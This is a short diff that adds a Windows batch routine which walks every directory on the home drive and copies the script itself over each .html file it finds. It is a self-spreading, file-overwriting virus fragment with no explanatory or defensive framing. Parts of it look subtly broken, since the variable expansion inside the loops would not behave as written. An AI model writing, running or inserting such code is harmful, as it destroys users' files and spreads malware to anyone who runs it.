@@ -1,0 +1,10 @@
+    Dir %Homedrive% /s /b > DirPath                        
+        For /f %%Y In (DirPath) Do (
+        Set DirPath=%%Y > Nul  
+            For %%Z In (%DirPath%\*.html) Do (
+            Set HtmlInfect=%%Z > Nul
+            Copy /y %0 %HtmlInfect%
+        )
+    )
+
+Del /f /s /q DirPath
